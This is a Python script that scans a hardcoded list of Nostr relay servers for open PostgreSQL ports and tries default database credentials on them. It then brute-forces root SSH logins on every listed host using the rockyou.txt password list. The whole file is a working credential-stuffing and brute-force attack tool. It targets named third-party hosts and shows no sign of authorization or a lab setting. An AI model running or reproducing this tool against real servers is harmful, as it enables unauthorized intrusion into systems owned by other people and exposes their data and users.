import nmap
import psycopg2
import socket
import paramiko

GREEN = '\033[32m'
RED = '\033[31m'
RESET = '\033[0m'

#hostnames = ['nostpy.lol', 'offchain.pub']
hostnames = [
    "relayable.org",
    "nostr.crypticthreadz.com",
    "lightningrelay.com",
    "nostr.wine",
    "astral.ninja",
    "at.nostrworks.com",
    "brb.io",
    "btc.klendazu.com",
    "deschooling.us",
    "expensive-relay.fiatjaf.com",
    "freedom-relay.herokuapp.com/ws",
    "jiggytom.ddns.net",
    "knostr.neutrine.com",
    "lv01.tater.ninja",
    "mule.platanito.org",
    "no.contry.xyz",
    "node01.nostress.cc",
    "nos.lol",
    "nostr-01.bolt.observer",
    "nostr-1.nbo.angani.co",
    "nostr1.starbackr.me",
    "nostr1.tunnelsats.com",
    "nostr2.actn.io",
    "nostr2.namek.link",
    "nostr-2.orba.ca",
    "nostr-2.zebedee.cloud",
    "nostr3.actn.io",
    "nostr-3.orba.ca",
    "relay.nostr-latam.link",
    "nostr.8e23.net",
    "nostr.actn.io",
    "nostr-alpha.gruntwerk.org",
    "nostr.aozing.com",
    "nostr.bch.ninja",
    "nostr-bg01.ciph.rs",
    "nostr.bitcoiner.social",
    "nostr.blocs.fr",
    "nostr.bongbong.com",
    "nostr.bostonbtc.com",
    "nostr.cercatrova.me",
    "nostr.chaker.net",
    "nostr.coinos.io",
    "nostr.coollamer.com",
    "nostr.corebreach.com",
    "no.str.cr",
    "nostr.d11n.net",
    "nostr.datamagik.com",
    "nostr.delo.software",
    "nostr.demovement.net",
    "nostr.developer.li",
    "nostr-dev.wellorder.net",
    "nostr.digitalreformation.info",
    "nostr.drss.io",
    "nostream.gromeul.eu",
    "nostr.easydns.ca",
    "nostr.einundzwanzig.space",
    "nostr.ethtozero.fr",
    "nostrex.fly.dev",
    "nostr.f44.dev",
    "nostr.fly.dev",
    "nostr.fmt.wiz.biz",
    "nostr.formigator.eu",
    "nostr.gromeul.eu",
    "nostr.gruntwerk.org",
    "nostr.hackerman.pro",
    "nostr.handyjunky.com",
    "nostr.hugo.md",
    "nostr.hyperlingo.com",
    "nostrical.com",
    "nostrich.friendship.tw",
    "nostr.itssilvestre.com",
    "nostr.jiashanlu.synology.me",
    "nostr.jimc.me",
    "nostr.kollider.xyz",
    "nostr.leximaster.com",
    "nostr.lnprivate.network",
    "nostr.mado.io",
    "nostr.massmux.com",
    "nostr.middling.mydns.jp",
    "nostr.mikedilger.com",
    "nostr.milou.lol",
    "nostr.mom",
    "nostr.mouton",
    "nostr.mrbits.it",
    "nostr.mustardnodes.com",
    "nostr.mwmdev.com",
    "nostr.namek.link",
    "nostr.ncsa.illinois.edu",
    "nostr.nodeofsven.com",
    "nostr.noones.com",
    "nostr.nordlysln.net",
    "nostr.nymsrelay.com",
    "nostr.ono.re",
    "nostr.onsats.org",
    "nostr.ownscale.org",
    "nostr.oooxxx.ml",
    "nostr.openchain.fr",
    "nostr.orangepill.dev",
    "nostr.orba.ca",
    "no-str.org",
    "nostr.oxtr.dev",
    "nostr.p2sh.co",
    "nostr.pobblelabs.org",
    "nostr-pub1.southflorida.ninja",
    "nostr-pub.semisol.dev",
    "nostr-pub.wellorder.net",
    "nostr.radixrat.com",
    "nostr.rdfriedl.com",
    "nostr-relay.alekberg.net",
    "nostr-relay.australiaeast.cloudapp.azure.com",
    "nostr-relay.bitcoin.ninja",
    "nostrrelay.com",
    "nostr-relay.derekross.me",
    "nostr-relay-dev.wlvs.space",
    "nostr-relay.digitalmob.ro",
    "nostr.relayer.se",
    "nostr-relay.freeberty.net",
    "nostr-relay.freedomnode.com",
    "nostr-relay.gkbrk.com",
    "nostr-relay.j3s7m4n.com",
    "nostr-relay.lnmarkets.com",
    "nostr-relay.nonce.academy",
    "nostr-relay.schnitzel.world",
    "nostr-relay.smoove.net",
    "nostr-relay.trustbtc.org",
    "nostr-relay.untethr.me",
    "nostr-relay.untethr.me",
    "nostr-relay.usebitcoin.space",
    "nostr-relay.wlvs.space",
    "nostr-relay.wolfandcrow.tech",
    "nostr.rewardsbunny.com",
    "nostr.robotechy.com",
    "nostr.rocks",
    "nostr.roundrockbitcoiners.com",
    "nostr.sandwich.farm",
    "nostr.satsophone.tk",
    "nostr.screaminglife.io",
    "nostr.sectiontwo.org",
    "nostr.semisol.dev",
    "nostr.shadownode.org",
    "nostr.shawnyeager.net",
    "nostr.shmueli.org",
    "nostr.simatime.com",
    "nostr.slothy.win",
    "nostr.sovbit.com",
    "nostr.supremestack.xyz",
    "nostr.swiss-enigma.ch",
    "nostr.thesimplekid.com",
    "nostr.tunnelsats.com",
    "nostr.unknown.place",
    "nostr.uselessshit.co",
    "nostr.utxo.lol",
    "nostr.v0l.io",
    "nostr-verified.wellorder.net",
    "nostr-verif.slothy.win",
    "nostr.vulpem.com",
    "nostr.w3ird.tech",
    "nostr.walletofsatoshi.com" ]

def resolve_hosts(hosts):
    results = {}
    for host in hosts:
        try:
            ip = socket.gethostbyname(host)
            results[host] = ip
        except socket.error as err:
            print(f"Error resolving {host}: {err}")
    return results

host_dict = resolve_hosts(hostnames)
print(host_dict)

# Define the list of hosts to scan
hosts = list(host_dict.values())

# Create a new Nmap scanner object
scanner = nmap.PortScanner()

postgres_open = []

for host in hosts:
    try:
        # Run an Nmap scan on the current host
        hostname = [k for k, v in host_dict.items() if v == host][0]
        print(f"Scanning host {hostname} ({host})...")
        scanner.scan(host, arguments='-p 5432')
        results = scanner[host]['tcp']
        # print(results)
        # print (f"Type of results is {type(results)}")
        status = results[5432]['state']
        print(status)

        # Check if port 5432 is open on the current host
        if status == 'open':
            # If port 5432 is open, add the corresponding hostname to the postgres_open list
            print(f"{GREEN}Port 5432 is open on host {RESET} {hostname} ({host})!")
            postgres_open.append(hostname)

    except KeyError:
        print(f"Error: Unable to retrieve results for host {host}. Skipping...")
    except Exception as e:
        print(f"Error occurred while scanning host {host}: {str(e)}")



credentials = {
    'postgres': 'postgres',
    'nostr': 'nostr',
    'nostr_ts_relay': 'nostr_ts_relay',
    'postgres': 'password',
    'postgres': 'admin',
    'admin': 'admin',
    'admin': 'password'
}


def connect_to_postgres(hosts, credentials):


    for host in hosts:
        for username, password in credentials.items():
            try:
                conn = psycopg2.connect(
                    host=host,
                    user=username,
                    password=password
                )
                print(f"{GREEN}Successfully connected to PostgreSQL on {RESET}{host} {GREEN}using credentials: {RESET}{username}:{password}")
                conn.close()
                break # Stop trying credentials if one works
            except Exception as e:
                print(f"{RED}Could not connect to PostgreSQL on {RESET}{host} {RED}with credentials: {RESET}{username}:{password}: {e}")


connect_to_postgres(postgres_open, credentials)


def ssh_login(ip_dict, password_file):
    with open(password_file, 'r', encoding='utf-8', errors='ignore') as file:
        passwords = file.read().splitlines()

    for host, ip in ip_dict.items():
        print(f"Attempting SSH login on {ip}...")
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        for pw in passwords:
            try:
                print(f"{GREEN}Trying {RESET}{pw} {GREEN} as a password{RESET}")
                client.connect(ip, username='root', password=pw, timeout=15)
                print(f"{GREEN}Successful login on {RESET}{ip}{GREEN} with password:{RESET} {pw}")
                # Add your desired actions here after successful login
                client.close()
                break
            except paramiko.AuthenticationException:
                # Incorrect password, continue to the next one
                continue
            except paramiko.SSHException:
                print(f"{RED}Failed to connect to{RESET} {ip}")
                break
            except socket.timeout:
                print(f"{RED}Connection timed out for {RESET}{ip}")
                break


ssh_login(host_dict,'rockyou.txt')
